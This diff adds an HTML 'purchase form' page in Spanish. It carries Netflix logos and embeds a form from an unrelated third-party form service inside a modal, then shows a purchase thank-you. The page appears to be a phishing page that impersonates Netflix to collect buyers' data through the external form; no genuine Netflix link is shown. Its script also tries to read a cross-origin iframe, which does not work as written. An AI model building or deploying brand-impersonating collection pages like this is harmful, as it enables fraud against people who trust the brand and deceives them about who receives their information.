@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Compra</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        header {
+            width: 100%;
+            background-color: #141414;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .logo {
+            max-height: 50px;
+        }
+
+        .modal {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4);
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 20px;
+            border: 2px solid #ed7318;
+            width: 90%;
+            max-width: 600px;
+            text-align: center;
+            position: relative;
+            box-sizing: border-box;
+        }
+
+        .modal-header {
+            margin-bottom: 20px;
+        }
+
+        .modal-logo {
+            max-height: 50px;
+            display: block;
+            margin: 0 auto;
+        }
+
+        #close-form-modal, #close-thank-you-modal {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #e50914;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+
+        .form-frame {
+            width: 100%;
+            height: 500px;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Logo de Netflix" class="logo">
+    </header>
+    <div id="form-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Logo de Netflix" class="modal-logo">
+            </div>
+            <iframe src="https://www.fluidforms.co/embed/form?id=679a1fda7f67fda4582268e8" frameborder="0" class="form-frame"></iframe>
+        </div>
+    </div>
+    <div id="thank-you-modal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <p>Gracias por su compra</p>
+            <button id="close-thank-you-modal">Cerrar</button>
+        </div>
+    </div>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const thankYouModal = document.getElementById('thank-you-modal');
+            const closeThankYouModalButton = document.getElementById('close-thank-you-modal');
+            const iframe = document.querySelector('.form-frame');
+
+            // Function to show the thank you modal
+            function showThankYouModal() {
+                thankYouModal.style.display = 'block';
+            }
+
+            // Close the thank you modal
+            closeThankYouModalButton.addEventListener('click', function() {
+                thankYouModal.style.display = 'none';
+            });
+
+            // Listen for changes in the iframe
+            iframe.addEventListener('load', function() {
+                const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+
+                // Create a MutationObserver to detect changes in the iframe DOM
+                const observer = new MutationObserver(function(mutations) {
+                    mutations.forEach(function(mutation) {
+                        if (mutation.type === 'childList') {
+                            // Check if the thank you message is present in the iframe
+                            const thankYouMessage = iframeDocument.body.textContent.includes('GRACIAS POR TU ENVIO');
+                            if (thankYouMessage) {
+                                showThankYouModal();
+                            }
+                        }
+                    });
+                });
+
+                // Start observing the body of the iframe for changes
+                observer.observe(iframeDocument.body, { childList: true, subtree: true });
+
+                // Listen for the form submit event directly (fallback method)
+                const form = iframeDocument.querySelector('form');
+                if (form) {
+                    form.addEventListener('submit', function(event) {
+                        setTimeout(showThankYouModal, 1000); // Assuming the form submission takes 1 second
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
